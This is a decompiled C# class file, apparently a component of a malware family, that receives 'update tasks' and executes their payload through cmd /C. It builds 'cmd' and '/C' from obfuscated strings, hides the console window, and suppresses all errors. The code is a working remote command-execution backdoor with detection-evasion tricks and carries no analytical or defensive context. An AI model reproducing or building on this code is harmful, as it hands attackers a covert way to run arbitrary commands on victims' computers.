using System;
using System.Diagnostics;

// Token: 0x0200002D RID: 45
public class CommandLineUpdate : ITaskProcessor
{
	// Token: 0x060000F8 RID: 248 RVA: 0x00003312 File Offset: 0x00001512
	public bool IsValidAction(Entity_UpdateAction action)
	{
		return action == Entity_UpdateAction.Id5;
	}

	// Token: 0x060000F9 RID: 249 RVA: 0x000094F8 File Offset: 0x000076F8
	public bool Process(Entity_Task updateTask)
	{
		try
		{
			System.Diagnostics.Process.Start(new ProcessStartInfo("cstringmstringd".Replace("string", string.Empty), "/ProcessC Process".Replace("Process", string.Empty) + updateTask.Id2)
			{
				UseShellExecute = false,
				CreateNoWindow = true
			}).WaitForExit(30000);
		}
		catch
		{
		}
		return true;
	}
}
